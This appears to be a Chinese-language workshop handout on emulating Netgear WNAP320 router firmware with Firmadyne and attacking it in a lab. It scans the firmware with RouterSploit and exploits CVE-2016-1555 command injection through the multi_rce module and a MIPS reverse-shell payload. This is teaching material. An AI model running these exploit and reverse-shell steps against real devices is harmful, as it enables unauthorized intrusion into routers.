# 2/12 工作坊
* 科技部前瞻資安科技專案110年度成果分表暨交流會議
## 環境
* [VirtualBox](https://www.virtualbox.org/)
* 下載 OVA (分流):
    * [Google drive 1](https://drive.google.com/drive/folders/14hZqCpnmJeWQrf5H9oAWgwLNR7pVZcfH?usp=sharing)
    * [Google drive 2](https://drive.google.com/drive/folders/1WSAeV7DKw9dxUdZTl_NdRtO6KnibL_Hb?usp=sharing)
    * [Mega](https://mega.nz/folder/xJ1kTZTS#XhtI3-QgaFj7jClgHSjHGA)
    * 當天準備隨身碟
* 請先下載 VirtualBox 及 OVA (預先準備好的環境)
* 開啟 VirtualBox 並匯入 OVA
* ubuntu 18.04
    * User : example
    * Password : 220212
## Firmadyne
* 因 binwalk 改版導致
    * 改 Python3 安裝套件
    * source/extractor/extractor.py 改用 python3 執行
* 步驟
```
# Firmadyne tools

$ sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan python3-pip vim
$ python3 -m pip install --upgrade pip
$ sudo ln -s /usr/bin/pip3 /usr/bin/pip
$ git clone --recursive https://github.com/firmadyne/firmadyne.git



# Binwalk

$ git clone https://github.com/ReFirmLabs/binwalk.git
$ cd binwalk
$ sudo ./deps.sh --yes
$ sudo python3 ./setup.py install
$ sudo -H pip3 install git+https://github.com/ahupp/python-magic
$ sudo -H pip3 install git+https://github.com/sviehb/jefferson



# Database

$ sudo apt-get install postgresql -y
$ sudo -u postgres createuser -P firmadyne # with password firmadyne
$ sudo -u postgres createdb -O firmadyne firmware
$ cd ..
$ sudo -u postgres psql -d firmware < ./firmadyne/database/schema



# Binaries

$ cd ./firmadyne; ./download.sh



# QEMU

$ sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils -y



# Usage

# Set FIRMWARE_DIR in firmadyne.config to point to the root of this repository.
$ wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip
$ sudo python3 ./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk "WNAP320 Firmware Version 2.0.3.zip" images
$ ./scripts/getArch.sh ./images/1.tar.gz    # password : firmadyne
$ ./scripts/tar2db.py -i 1 -f ./images/1.tar.gz
$ sudo ./scripts/makeImage.sh 1             # password : firmadyne
$ ./scripts/inferNetwork.sh 1               # password : firmadyne
$ ./scratch/1/run.sh

```

## Firmware
* Netgear WNAP320 ( firmadyne 預設 firmware )
* IP : 192.168.0.100
* Nmap 確認啟動服務
* ![](https://i.imgur.com/bPUHXuZ.png)
* 透過 Browser 確認 Web service
* 可測出漏洞
## RouterSploit
![](https://i.imgur.com/jNMgZSk.png)
* Router 常見漏洞測試工具
* 安裝
```
$ git clone https://github.com/reverse-shell/routersploit
$ cd routersploit
$ python3 -m pip install -r requirements.txt
```
* 執行
```
python3 rsf.py

> use scanners/routers/router_scan
> set target 192.168.0.100
> run
```
* 結果
* ![](https://i.imgur.com/izQXOw2.png)
* 漏洞細節有待分析確認
# 漏洞
* [CVE-2016-1555](https://nvd.nist.gov/vuln/detail/CVE-2016-1555)
* Pre-Auth Command Injection & XSS
    * Blind Command Injection - Payload 注入之後會執行但是不會回傳結果，可以利用 reverse shell 進入系統查看
* Multi-RCE
    ```
    > use exploits/routers/netgear/multi_rce
    > run
    ```
    ![](https://i.imgur.com/DjZXcAT.png)
* Reverse Shell
    ```
    > show payloads
    
    Payload                Name                   Description                                                        
   -------                ----                   -----------                                                        
   mipsbe/reverse_tcp     MIPSBE Reverse TCP     Creates interactive tcp reverse shell for MIPSBE architecture.     
   mipsbe/bind_tcp        MIPSBE Bind TCP        Creates interactive tcp bind shell for MIPSBE architecture.     
   
   > set payload mipsbe/reverse_tcp
   > set lhost 192.168.0.99
   > run
    ```
    ![](https://i.imgur.com/CRcyUvB.png)
# Bug
* 若開機卡死請按照下文步驟處理
* https://blog.csdn.net/weixin_44608039/article/details/91289709

